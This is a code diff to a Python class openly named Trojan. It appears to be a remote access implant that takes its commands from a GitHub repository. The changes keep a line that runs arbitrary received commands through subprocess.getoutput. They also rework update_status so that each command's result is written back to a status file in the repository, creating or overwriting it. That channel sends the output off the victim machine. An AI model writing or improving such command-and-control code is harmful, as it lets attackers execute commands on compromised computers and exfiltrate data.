@@ -1,5 +1,4 @@
 import base64
-import subprocess
 import github3
 import importlib
 import json
@@ -7,6 +6,7 @@ import random
 import sys
 import threading
 import time
+import subprocess  # Import subprocess module
 from datetime import datetime
 
 def github_connect():
@@ -58,12 +58,21 @@ class Trojan:
             self.running = True
             self.update_status('Running')
         else:
-            result = subprocess.getoutput(command)
+            result = subprocess.getoutput(command)  # Using subprocess to execute the command
             self.update_status(f"Command '{command}' executed with result: {result}")
 
     def update_status(self, status):
         status_file_path = f'status/{self.id}.status'
-        self.repo.create_file(status_file_path, status, status.encode('utf-8'))
+        
+        # Check if the status file already exists
+        try:
+            contents = self.repo.file_contents(status_file_path)
+            sha = contents.sha
+            # If the file exists, update it
+            self.repo.update_file(status_file_path, status, status.encode('utf-8'), sha)
+        except github3.exceptions.NotFoundError:
+            # If the file doesn't exist, create it
+            self.repo.create_file(status_file_path, status, status.encode('utf-8'))
 
     def run(self):
         while self.running:
